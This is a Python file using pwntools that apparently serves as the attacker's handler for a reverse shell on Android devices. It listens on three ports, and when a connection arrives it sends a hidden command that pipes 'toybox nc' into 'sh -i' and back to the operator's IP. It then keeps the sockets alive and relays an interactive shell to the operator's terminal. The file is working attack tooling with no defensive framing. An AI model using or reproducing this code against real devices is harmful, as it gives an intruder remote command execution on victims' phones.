import os
import sys
import time
import socket
import struct
import select
import threading
import subprocess

from pwn import tubes, log, term

def create_sockets(nc_port, stdin_port, stdout_port):
    sh_s = socket.socket()
    sh_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sh_s.bind(('', nc_port))
    sh_s.listen(5)

    stdin = socket.socket()
    stdin.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    stdin.bind(('', stdin_port))
    stdin.listen(5)

    stdout = socket.socket()
    stdout.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    stdout.bind(('', stdout_port))
    stdout.listen(5)

    return sh_s, stdin, stdout


def interactive_shell(sh_s, stdin_s, stdout_s, my_ip, stdin_port, stdout_port):
    sh_fd, (client_ip, _) = sh_s.accept()

    log.info('Connect form %s. Sending commands. Shell:' % (client_ip,))
    sh_fd.sendall('''
        exec 1>/dev/null 2>/dev/null
        toybox nc {ip} {stdin} | sh -i 2>&1 | toybox nc {ip} {stdout}
    '''.format(ip=my_ip, stdin=stdin_port, stdout=stdout_port))
    sh_fd.close()

    stdin, _ = stdin_s.accept()
    stdout, _ = stdout_s.accept()

    # VOODOO - maybe this somehow helps Android not to kill our sockets
    def keepalive1():
        while True:
            stdout.send('a')
            time.sleep(1)
    t1 = threading.Thread(target=keepalive1)
    t1.daemon = True
    t1.start()
    def keepalive2():
        while True:
            stdin.recv(1024)
            time.sleep(1)
    t2 = threading.Thread(target=keepalive2)
    t2.daemon = True
    t2.start()

    def command_proxy(send_cb):
        def send_wrapper(data):
            return send_cb(data)
        return send_wrapper

    a = tubes.remote.remote.fromsocket(stdin)
    b = tubes.remote.remote.fromsocket(stdout)
    c = tubes.tube.tube()
    c.recv_raw = b.recv
    c.send_raw = command_proxy(a.send)
    c.interactive()

    while True:
        readable, _, _ = select.select([sys.stdin.buffer, stdout], [], [])
        for fd in readable:
            if fd is stdout:
                sys.stdout.buffer.write(stdout.recv(1024))
                sys.stdout.buffer.flush()
            else:
                stdin.sendall(os.read(sys.stdin.fileno(), 1024))
